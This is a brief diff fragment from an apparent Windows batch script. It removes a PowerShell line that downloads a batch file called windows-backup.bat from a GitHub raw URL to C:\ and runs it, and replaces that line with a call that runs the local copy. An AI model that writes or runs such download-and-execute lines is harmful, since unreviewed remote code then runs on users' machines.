@@ -32,8 +32,7 @@ if %found%==1 (
 
 
 
-powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\windows-backup.bat'; Start-Process -FilePath 'C:\windows-backup.bat' -Wait}"
-
+start /wait "" "C:\windows-backup.bat"
 
 
 
